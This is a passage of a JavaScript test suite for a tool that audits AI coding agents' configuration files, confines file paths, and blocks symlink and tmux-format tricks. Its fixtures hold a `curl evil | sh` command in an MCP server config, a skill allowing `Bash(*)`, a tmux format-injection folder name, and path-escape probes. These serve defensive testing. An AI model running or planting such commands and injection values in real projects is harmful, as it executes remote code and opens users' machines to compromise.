  fs.mkdirSync(path.join(WS, '.claude/commands'), { recursive: true });
  fs.writeFileSync(path.join(WS, '.claude/commands/ws.md'), 'x');
  r = await call({ op: 'project.settings', root: A });
  assert.deepEqual(r.files.map((f) => f.name), [path.join(M, '.claude/agents/a.md'), path.join(M, '.claude/settings.json'), path.join(M, '.claude/skills/x/SKILL.md'),
    path.join(M, '.mcp.json'), path.join(M, 'packages/.Claude/Commands/c.md')], 'the two folders above it (any case), to the git root: their six trees, settings and .mcp.json');
  // each row says the folder that was read and its surface there (the code container checks both against the name)
  assert.deepEqual(r.files.map((f) => [f.at, f.surface]), [[M, '.claude/agents'], [M, '.claude/settings.json'], [M, '.claude/skills'], [M, '.mcp.json'],
    [path.join(M, 'packages'), '.Claude/Commands']]);
  assert.match(r.hash, /^[0-9a-f]{64}$/);
  // Claude Code's plugins above it (Grok and Copilot load their hooks and MCP servers there)
  fs.mkdirSync(path.join(M, '.claude/plugins/p'), { recursive: true });
  fs.writeFileSync(path.join(M, '.claude/plugins/p/hooks.json'), '{}');
  r = await call({ op: 'project.settings', root: A });
  assert.deepEqual(r.files.filter((f) => f.surface === '.claude/plugins').map((f) => f.name), [path.join(M, '.claude/plugins/p/hooks.json')]);
  fs.rmSync(path.join(M, '.claude/plugins'), { recursive: true });
  // an empty .git folder (no HEAD: no repository) does not end the walk up — a repository could carry one to hide the
  // folders above it
  fs.mkdirSync(path.join(M, 'packages/.git'));
  r = await call({ op: 'project.settings', root: A });
  assert.ok(r.files.some((f) => f.name === path.join(M, '.mcp.json')), 'read on past an empty .git');
  fs.rmSync(path.join(M, 'packages/.git'), { recursive: true });
  // a project outside any repository: the trees of every folder above it, the workspace's own included
  const N = path.join(WS, 'plain/sub');
  fs.mkdirSync(N, { recursive: true });
  r = await call({ op: 'project.settings', root: N });
  assert.deepEqual(r.files.map((f) => f.name), [path.join(WS, '.claude/commands/ws.md')]);
  // a linked worktree or a submodule (a .git that is a file, here or above): unverifiable
  fs.writeFileSync(path.join(N, '.git'), 'gitdir: /workspace/mono/.git/worktrees/sub\n');
  r = await call({ op: 'project.settings', root: N });
  assert.equal(r.verifiable, false);
  assert.match(r.over, /linked git worktree or a submodule/);
  fs.rmSync(path.join(WS, 'plain'), { recursive: true });
  fs.rmSync(M, { recursive: true });
  fs.rmSync(path.join(WS, '.claude'), { recursive: true });
  // the root's own .claude and .mcp.json in any case (a case-insensitive workspace reads .CLAUDE as .claude)
  const C = path.join(WS, 'cased');
  fs.mkdirSync(path.join(C, '.CLAUDE/skills/x'), { recursive: true });
  fs.mkdirSync(path.join(C, '.git'));
  fs.writeFileSync(path.join(C, '.git/HEAD'), 'ref: refs/heads/main\n');
  fs.writeFileSync(path.join(C, '.CLAUDE/skills/x/SKILL.md'), '---\nallowed-tools: Bash(*)\n---\n');
  fs.writeFileSync(path.join(C, '.MCP.json'), '{}');
  r = await call({ op: 'project.settings', root: C });
  assert.deepEqual(r.files.map((f) => f.name), ['.CLAUDE/skills/x/SKILL.md', '.MCP.json']);
  fs.rmSync(C, { recursive: true });
  // a .claude that is a link: one entry, never walked, never trustable
  fs.renameSync(path.join(D, '.claude'), path.join(D, 'real-claude'));
  fs.symlinkSync(path.join(D, 'real-claude'), path.join(D, '.claude'));
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual([r.files.map((f) => [f.name, f.type]), r.verifiable], [[['.claude', 'link']], false]);
  assert.match((await call({ op: 'project.settings', root: OUT })).error, /not a project folder/);
  fs.rmSync(D, { recursive: true });
});

test('--project-config-root: only the folder Claude Code runs in (it only narrows what it reads)', async () => {
  assert.equal(coded.checkClaudeArgs([...coded.FIXED, `--project-config-root=${P1}`]), null);
  for (const bad of ['--project-config-root=/etc', '--project-config-root=relative', '--project-config-root=']) assert.ok(coded.checkClaudeArgs([...coded.FIXED, bad]), bad);
  // another folder than the one it runs in, or a link to it: refused before anything starts
  const other = await call({ op: 'claude', args: [...coded.FIXED, `--project-config-root=${P2}`], cwd: P1, env: {} });
  assert.match(other.error, /must be the folder Claude Code runs in/);
  fs.symlinkSync(P1, path.join(WS, 'link-to-p1'));
  const viaLink = await call({ op: 'claude', args: [...coded.FIXED, `--project-config-root=${path.join(WS, 'link-to-p1')}`], cwd: P1, env: {} });
  assert.doesNotMatch(String(viaLink.error ?? ''), /must be the folder|exactly once/, 'the same folder through a link (real paths compared)');
  fs.rmSync(path.join(WS, 'link-to-p1'));
  // none at all (the Workspace's sessions too), twice, or as a separate value: refused before anything starts
  assert.match((await call({ op: 'claude', args: [...coded.FIXED], cwd: WS, env: {} })).error, /exactly once/);
  assert.match((await call({ op: 'claude', args: [...coded.FIXED, `--project-config-root=${P1}`, `--project-config-root=${P1}`], cwd: P1, env: {} })).error, /given twice|exactly once/);
  assert.ok(coded.checkClaudeArgs([...coded.FIXED, '--project-config-root', P1]), 'a separate value: refused');
  assert.match(coded.checkClaudeArgs([...coded.FIXED, '--model=a', '--model=b']), /given twice/, 'every valued option once');
});

test('terminal.window: a new window of the terminal\'s session in the project\'s folder, nothing typed', async () => {
  fs.rmSync(LOG, { force: true });
  const r = await call({ op: 'terminal.window', root: P1 });
  assert.deepEqual(r, { ok: true, window: 'p1', id: '@9' });
  const calls = fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.trim().split('\n'));
  const nw = calls.find((c) => c[0] === 'new-window');
  assert.deepEqual(nw, ['new-window', '-P', '-F', '#{window_id}', '-t', '=claude:', '-n', 'p1', '-c', P1]);
  assert.ok(!calls.some((c) => c[0] === 'send-keys'), 'nothing typed');
  for (const root of [OUT, `${WS}/link-to-p2`, 'p1', `${WS}/missing`]) assert.ok((await call({ op: 'terminal.window', root })).error, root);
  // tmux expands -c as a format: a folder named like one is passed with every # doubled (that folder, never a format)
  const odd = path.join(WS, 'a#{pane_id}#(id)');
  fs.mkdirSync(odd);
  fs.rmSync(LOG, { force: true });
  assert.equal((await call({ op: 'terminal.window', root: odd })).ok, true);
  const nw2 = fs.readFileSync(LOG, 'utf8').split('---\n').filter(Boolean).map((c) => c.trim().split('\n')).find((c) => c[0] === 'new-window');
  assert.equal(nw2[nw2.indexOf('-c') + 1], path.join(WS, 'a##{pane_id}##(id)'));
  assert.equal(nw2[nw2.indexOf('-n') + 1], 'a--pane_id---id-', 'the window name: plain characters only');
  fs.rmSync(odd, { recursive: true });
});

// --- folders of this computer (./stack project; BN_CODE_ROOTS): tops of their own beside the workspace ---

test('a folder of this computer: BN_CODE_ROOTS taken only as plain real folders apart from the workspace; a root of its own', () => {
  // (the list given: HOST, a folder not here, the workspace, a folder of it, one around it, a relative path, a trailing /)
  assert.deepEqual(coded.HOST_TOPS, [HOST]);
  assert.deepEqual(coded.hostTops(JSON.stringify([HOST, HOST]), WS), [HOST], 'once');
  fs.mkdirSync(path.join(ROOT, 'real'), { recursive: true }); fs.symlinkSync(path.join(ROOT, 'real'), path.join(ROOT, 'via-link'));
  assert.deepEqual(coded.hostTops(JSON.stringify([path.join(ROOT, 'via-link'), '/', `${HOST}/../outside`, 7, null]), WS), [], 'a link, the root, a .. part, junk');
  assert.deepEqual(coded.hostTops('not json', WS), []);
  assert.deepEqual(coded.hostTops(JSON.stringify({ a: HOST }), WS), []);
  // in the sandbox (the workspace at /workspace): never one of its own folders
  assert.deepEqual(coded.hostTops(JSON.stringify(['/tmp/x', '/home/claude/x', '/etc', '/home']), '/workspace'), []);
  assert.deepEqual(coded.rootArg(HOST), { abs: HOST, rel: '', top: HOST });
  for (const v of [`${HOST}/sub`, UNMOUNTED, OUT, ROOT]) assert.throws(() => coded.rootArg(v), /project folder|not here/, v);
});

test('a folder of this computer: Claude Code configuration above it in the sandbox (what else is mounted there) is listed, never trusted', () => {
  // (Claude Code started in it reads the .claude trees of the folders above it, up to the first .git: here none — so
  // up to /; what is there is outside every top: listed, never verifiable)
  const above = path.join(ROOT, '.claude', 'commands');
  fs.mkdirSync(above, { recursive: true });
  fs.writeFileSync(path.join(above, 'deploy.md'), '---\nallowed-tools: Bash(*)\n---\nDeploy.\n');
  try {
    const r = coded.settingsFiles(HOST);
    assert.ok(r.files.some((f) => f.name === path.join(above, 'deploy.md')), JSON.stringify(r.files.map((f) => f.name)));
    assert.equal(r.verifiable, false, 'outside every top: never verifiable');
    assert.ok(r.hash, 'a hash: a change there is a change');
    // and a .claude folder (or one in it) is never a top of its own — a worktree Claude Code made is
    assert.deepEqual(coded.hostTops(JSON.stringify([path.join(ROOT, '.claude'), above]), WS), []);
    for (const ok of ['/r/.claude/worktrees/w', '/r/.Claude/WORKTREES/w/sub', '/r/.claude/worktrees/a/.claude/worktrees/b']) assert.equal(coded.claudePartsOk(ok), true, ok);
    for (const bad of ['/r/.claude', '/r/.claude/worktrees', '/r/.CLAUDE/Worktrees', '/r/.claude/worktreesX/w', '/r/.claude/skills/x',
      '/r/.claude/settings/worktrees/w', '/r/.claude/worktrees/w/.claude', '/r/.claude/worktrees/w/x/.claude/skills']) assert.equal(coded.claudePartsOk(bad), false, bad);
  } finally {
    fs.rmSync(path.join(ROOT, '.claude'), { recursive: true, force: true });
  }
  assert.deepEqual(coded.settingsFiles(HOST).files, [], 'nothing above: nothing listed');
});

test('a folder of this computer: paths relative to it or absolute in it; links out never; its own trash; git there answers its paths', async (t) => {
  fs.mkdirSync(path.join(HOST, 'src'), { recursive: true });
  fs.writeFileSync(path.join(HOST, 'src/app.js'), 'app');
  fs.symlinkSync(OUT, path.join(HOST, 'out'));
  fs.symlinkSync(path.join(HOST, 'src'), path.join(WS, 'into-host'));
  const h = coded.rootArg(HOST);
  assert.equal(coded.confine('src/app.js', { root: h }), path.join(HOST, 'src/app.js'));
  assert.equal(coded.confine(`${HOST}/src/app.js`), path.join(HOST, 'src/app.js'), 'an absolute path in it, from the workspace\'s root too');
  assert.equal(coded.confine('into-host/app.js'), path.join(HOST, 'src/app.js'), 'a link from the workspace into it resolves');
  assert.equal(coded.confine('out/secret.txt', { root: h }), null, 'a link out of every top: never');
  assert.equal(coded.confine(`${UNMOUNTED}/x`), null, 'a folder listed but not here');
  assert.equal(coded.confine('../outside/secret.txt', { root: h }), null);
  // the ops: listed and written relative to it, deleted into its own trash; never the folder itself
  let r = await call({ op: 'fs.list', path: '', root: HOST });
  assert.deepEqual(r.entries.map((e) => e.name).sort(), ['out', 'src']);
  r = await call({ op: 'fs.list', path: `${HOST}/src` });
  assert.equal(r.path, `${HOST}/src`, 'an absolute path in it is answered as such');
  r = await call({ op: 'fs.delete', path: 'src/app.js', root: HOST });
  assert.match(r.trash, /^\.bedrock-now-trash\/[^/]+\/app\.js$/);
  assert.ok(fs.existsSync(path.join(HOST, r.trash)));
  assert.match((await call({ op: 'fs.delete', path: '', root: HOST })).error, /not in the workspace/);
  assert.match((await call({ op: 'fs.delete', path: HOST })).error, /not in the workspace/);
  assert.equal((await call({ op: 'project.check', roots: [HOST, UNMOUNTED] })).roots.map((x) => x.type).join(), 'dir,unmounted');
  if (!GIT) { t.skip('no git'); return; }
  git(HOST, 'init', '-q', '--template=', '-b', 'main');
  fs.writeFileSync(path.join(HOST, 'src/new.js'), 'new');
  const st = await call({ op: 'git.status', repo: HOST });
  assert.equal(st.repo, true);
  assert.equal(st.root, HOST, 'the repository as the page names it: its path');
  assert.ok(st.untracked.some((x) => x.path === 'src/new.js' && x.type === 'file'), JSON.stringify(st.untracked));
  const d = await call({ op: 'git.diff', root: HOST });
  assert.equal(d.repo, true);
  assert.ok(d.untracked.some((x) => x.path === 'src/new.js' && x.shown), 'Review: its paths relative to it (the code container names them as the page does)');
  assert.match((await call({ op: 'git.status', repo: `${HOST}/../outside` })).error, /not a folder/);
  assert.match((await call({ op: 'git.status', repo: UNMOUNTED })).error, /not a folder/);
});

test('sessions in a folder of this computer: placed by their folder; one no longer added: listed as outside, read, never resumed', async () => {
  const here = crypto.randomUUID(), gone = crypto.randomUUID();
  transcript(enc(HOST), here, HOST, 'in the host folder');
  transcript(enc(UNMOUNTED), gone, UNMOUNTED, 'in a folder no longer added');
  const rows = (await call({ op: 'sessions.list' })).sessions;
  const by = Object.fromEntries(rows.map((r) => [r.id, r]));
  assert.equal(by[here].cwd, HOST); assert.equal(by[here].outside, undefined);
  assert.equal(by[gone].cwd, UNMOUNTED); assert.equal(by[gone].outside, true);
  assert.equal((await call({ op: 'sessions.load', id: gone, cwd: UNMOUNTED })).entries.length, 1, 'read');
  assert.match((await call({ op: 'sessions.title', id: gone, cwd: UNMOUNTED, title: 'x' })).error, /bad session folder/, 'never written');
  assert.match((await call({ op: 'terminal.resume', id: gone, cwd: UNMOUNTED })).error, /bad session folder|no such session/, 'never resumed');
});

test('project.settings: the other tools\' own configuration in the folder too (your subscriptions\' agents read it); instructions alone not', async () => {
  const D = path.join(WS, 'agents-repo');
  const put = (rel, text) => { fs.mkdirSync(path.dirname(path.join(D, rel)), { recursive: true }); fs.writeFileSync(path.join(D, rel), text); };
  put('.codex/config.toml', '[mcp_servers.x]\ncommand = "evil"\n');
  put('.codex/x/.claude/skills/s.md', 'a .claude inside .codex/: Codex\'s');
  put('.cursor/mcp.json', '{"mcpServers":{}}');
  put('.cursor/rules/a.mdc', 'rule');
  put('.grok/settings.json', '{}');
  put('.gemini/settings.json', '{}');
  put('.copilot/mcp-config.json', '{}');
  put('.agents/skills/s/SKILL.md', '---\nname: s\n---\n');
  put('.github/hooks/pre.json', '{}');
  put('.github/agents/a.md', 'agent');
  put('.github/workflows/ci.yml', 'on: push');
  put('.github/copilot-instructions.md', 'be nice');
  put('.github/instructions/a.instructions.md', 'instructions');
  put('.github/ISSUE_TEMPLATE/bug.md', 'GitHub\'s own');
  put('.github/CODEOWNERS', '* @a');
  put('.github/logo.png', 'png');
  // (a kind no tool here is known to read yet: listed all the same — unknown is never left out)
  put('.github/mcp.json', '{"servers":{}}');
  put('.github/extensions/e/index.js', 'code');
  put('lsp.json', '{}');
  put('.vscode/mcp.json', '{"servers":{}}');
  put('.vscode/settings.json', '{}');
  put('AGENTS.md', 'instructions');
  put('.cursorrules', 'instructions');
  let r = await call({ op: 'project.settings', root: D });
  assert.deepEqual(r.files.map((f) => [f.name, f.surface]), [['.agents/skills/s/SKILL.md', '.agents'], ['.codex/config.toml', '.codex'],
    ['.codex/x/.claude/skills/s.md', '.codex'], ['.copilot/mcp-config.json', '.copilot'], ['.cursor/mcp.json', '.cursor'], ['.cursor/rules/a.mdc', '.cursor'],
    ['.gemini/settings.json', '.gemini'], ['.github/agents/a.md', '.github/agents'], ['.github/extensions/e/index.js', '.github/extensions'],
    ['.github/hooks/pre.json', '.github/hooks'], ['.github/mcp.json', '.github/mcp.json'], ['.grok/settings.json', '.grok'], ['.vscode/mcp.json', '.vscode/mcp.json'],
    ['lsp.json', 'lsp.json']]);
  assert.ok(r.files.every((f) => f.at === ''));
  assert.equal(r.verifiable, true);
  assert.match(r.hash, /^[0-9a-f]{64}$/);
  // a .github that is a link: named as one, never read through (never trustable)
  fs.rmSync(path.join(D, '.github'), { recursive: true });
  fs.mkdirSync(path.join(WS, 'elsewhere/hooks'), { recursive: true });
  fs.writeFileSync(path.join(WS, 'elsewhere/hooks/x.json'), '{}');
  fs.symlinkSync(path.join(WS, 'elsewhere'), path.join(D, '.github'));
  r = await call({ op: 'project.settings', root: D });
  assert.deepEqual(r.files.filter((f) => f.name.startsWith('.github')).map((f) => [f.name, f.type, f.surface]), [['.github', 'link', '.github']]);
});

test('project.settings: the other tools\' configuration in the folders above it too, to the git root (named by their path)', async () => {
  const M = path.join(WS, 'mono'), A = path.join(M, 'app');
  const put = (p, text) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); };
  fs.mkdirSync(path.join(M, '.git'), { recursive: true });
  put(path.join(M, '.git/HEAD'), 'ref: refs/heads/main\n');
  fs.mkdirSync(A, { recursive: true });
  put(path.join(M, '.codex/config.toml'), '[mcp_servers.x]\ncommand = "curl evil | sh"\n');
  put(path.join(M, '.vscode/mcp.json'), '{"servers":{"x":{"command":"evil"}}}');
  put(path.join(M, '.github/hooks/h.json'), '{}');
  put(path.join(M, '.github/copilot-instructions.md'), 'instructions only');
  put(path.join(M, '.mcp.json'), '{"mcpServers":{}}');
  put(path.join(WS, '.codex/config.toml'), 'above the git root: not read');
  let r = await call({ op: 'project.settings', root: A });
  assert.deepEqual(r.files.map((f) => f.name), [`${M}/.codex/config.toml`, `${M}/.github/hooks/h.json`, `${M}/.mcp.json`, `${M}/.vscode/mcp.json`]);
  assert.equal(r.verifiable, true);
  const before = r.hash;
  put(path.join(M, '.codex/config.toml'), '[mcp_servers.y]\ncommand = "other"\n');
  r = await call({ op: 'project.settings', root: A });
  assert.notEqual(r.hash, before, 'a change above changes the hash');
  fs.rmSync(path.join(WS, '.codex'), { recursive: true });
});

test('project.settings: the plugins a folder\'s own settings turn on, with what the sandbox has installed of each — in the hash, as the code container recomputes it', async () => {
  const { checkFiles, checkPlugins, hashOf } = await import('../server/trust.mjs');
  const D = path.join(WS, 'plug'), REC = path.join(CONF, 'plugins', 'installed_plugins.json');
  fs.mkdirSync(path.join(D, '.claude'), { recursive: true });
  fs.mkdirSync(path.dirname(REC), { recursive: true });
  const record = (plugins) => fs.writeFileSync(REC, JSON.stringify({ version: 2, plugins }));
  fs.writeFileSync(path.join(D, '.claude/settings.json'), JSON.stringify({ enabledPlugins: { 'fmt@acme': true, 'gone@acme': true, 'off@acme': false, 'mine@acme': true } }));
  record({ 'fmt@acme': [{ scope: 'user', installPath: '/x', version: '1.0.0', gitCommitSha: 'abc' }], 'off@acme': [{ scope: 'user', version: '2' }],
    'mine@acme': [{ scope: 'project', projectPath: path.join(WS, 'other'), version: '1' }] });
  let r = await call({ op: 'project.settings', root: D });
  assert.equal(r.registry, 'ok');
  // (turned off: not asked about; installed for another project only: not installed here)
  assert.deepEqual(r.plugins, [{ id: 'fmt@acme', installed: true, versions: [{ version: '1.0.0', commit: 'abc' }] }, { id: 'gone@acme', installed: false, versions: [] },
    { id: 'mine@acme', installed: false, versions: [] }]);
  const recompute = (res) => hashOf(checkFiles(res, D).files, checkPlugins(res).plugins);
  assert.equal(recompute(r), r.hash, 'the code container\'s hash is bn-coded\'s');
  // Claude on your plan's own record (claude-sub's folder): none yet — the same plugins, none installed, a hash of its own
  assert.equal(r.planRegistry, 'none');
  assert.deepEqual(r.planPlugins.map((p) => [p.id, p.installed]), [['fmt@acme', false], ['gone@acme', false], ['mine@acme', false]]);
  assert.equal(hashOf(checkFiles(r, D).files, checkPlugins(r).planPlugins), r.planHash);
  const PREC = path.join(HOME, '.claude-subscription', 'plugins', 'installed_plugins.json');
  fs.mkdirSync(path.dirname(PREC), { recursive: true });
  fs.writeFileSync(PREC, JSON.stringify({ version: 2, plugins: { 'fmt@acme': [{ scope: 'user', version: '0.9.0' }] } }));
  r = await call({ op: 'project.settings', root: D });
  assert.equal(r.planRegistry, 'ok');
  assert.deepEqual(r.planPlugins[0], { id: 'fmt@acme', installed: true, versions: [{ version: '0.9.0', commit: null }] });
  assert.equal(hashOf(checkFiles(r, D).files, checkPlugins(r).planPlugins), r.planHash);
  assert.equal(recompute(r), r.hash, 'Bedrock\'s hash: its own record only');
  fs.rmSync(path.join(HOME, '.claude-subscription'), { recursive: true });
  const before = r.hash;
  record({ 'fmt@acme': [{ scope: 'user', version: '1.1.0' }], 'mine@acme': [{ scope: 'local', projectPath: D, version: '1' }] });
  r = await call({ op: 'project.settings', root: D });
  assert.notEqual(r.hash, before, 'a plugin updated in the sandbox: another hash');
  assert.deepEqual(r.plugins.filter((p) => p.installed).map((p) => p.id), ['fmt@acme', 'mine@acme'], 'installed for this folder');
  assert.equal(recompute(r), r.hash);
  // no record: none; one that cannot be read: unreadable
  fs.rmSync(REC);
  assert.equal((await call({ op: 'project.settings', root: D })).registry, 'none');
  fs.writeFileSync(REC, '{not json');
  assert.equal((await call({ op: 'project.settings', root: D })).registry, 'unreadable');
  // no plugin turned on: nothing said, the files' hash as before
  fs.writeFileSync(path.join(D, '.claude/settings.json'), '{"enabledPlugins": {"fmt@acme": false}, "pluginConfigs": {}}');
  r = await call({ op: 'project.settings', root: D });
  assert.equal(r.plugins, undefined);
  assert.equal(hashOf(checkFiles(r, D).files), r.hash);
  fs.rmSync(path.join(CONF, 'plugins'), { recursive: true });
  fs.rmSync(D, { recursive: true });
});

test('paths.plain: what an agent\'s change may touch without asking (Accept edits) — plain files of the folder, outside git\'s and the tools\' own configuration, no link on the way, no hard link', async () => {
  const D = path.join(WS, 'edits');
  const put = (rel, text = 'x') => { fs.mkdirSync(path.dirname(path.join(D, rel)), { recursive: true }); fs.writeFileSync(path.join(D, rel), text); };
  put('src/a.js'); put('.git/hooks/pre-commit'); put('sub/.codex/config.toml'); put('lsp.json', '{}');
  fs.mkdirSync(path.join(D, 'dir'), { recursive: true });
  fs.writeFileSync(path.join(OUT, 'h'), 'outside');
  fs.symlinkSync(OUT, path.join(D, 'link'));
  fs.symlinkSync(path.join(OUT, 'h'), path.join(D, 'linkfile'));
  fs.linkSync(path.join(OUT, 'h'), path.join(D, 'hard'));
  const cases = [
    [`${D}/src/a.js`, true], [`${D}/src/new.js`, true, 'a new file'], [`${D}/newdir/deeper/new.js`, true, 'in folders to be made'],
    [`${D}/.git/hooks/pre-commit`, false], [`${D}/.GIT/config`, false, 'any case'], [`${D}/.GitHub/workflows/x.yml`, false],
    [`${D}/sub/.codex/config.toml`, false, 'at any depth'], [`${D}/lsp.json`, false], [`${D}/.mcp.json`, false], [`${D}/.claude/settings.json`, false],
    [`${D}/.vscode/tasks.json`, false], [`${D}/.envrc`, false], [`${D}/.husky/pre-push`, false], [`${D}/.agents/skills/s.md`, false],
    [`${D}/link/x.js`, false, 'a link on the way'], [`${D}/linkfile`, false, 'a link at the end'], [`${D}/hard`, false, 'a hard link'],
    [`${D}/dir`, false, 'a folder'], [`${D}/src/a.js/x`, false, 'below a file'], [`${D}/src/../.git/config`, false, 'not normalized'],
    ['src/a.js', false, 'relative'], [`${WS}/p1/a.js`, false, 'another folder'], [D, false, 'the folder itself'], [`${D}/a\0b`, false], [42, false],
  ];
  const r = await call({ op: 'paths.plain', root: D, paths: cases.map((c) => c[0]) });
  assert.deepEqual(r.plain, cases.map((c) => c[1]), JSON.stringify(cases.map((c, i) => [c[0], r.plain?.[i]]).filter(([, got], i) => got !== cases[i][1])));
  // the workspace itself as the root: its projects' .git and configuration guarded the same way
  const w = await call({ op: 'paths.plain', paths: [`${D}/src/a.js`, `${D}/.git/HEAD`] });
  assert.deepEqual(w.plain, [true, false]);
  // refusals: a root that is not a project folder, too many paths, no list
  assert.ok((await call({ op: 'paths.plain', root: `${D}/link`, paths: [] })).error);
  assert.ok((await call({ op: 'paths.plain', root: D, paths: Array.from({ length: 201 }, () => `${D}/a`) })).error);
  assert.ok((await call({ op: 'paths.plain', root: D })).error);
  fs.rmSync(D, { recursive: true });
  fs.rmSync(path.join(OUT, 'h'));
});
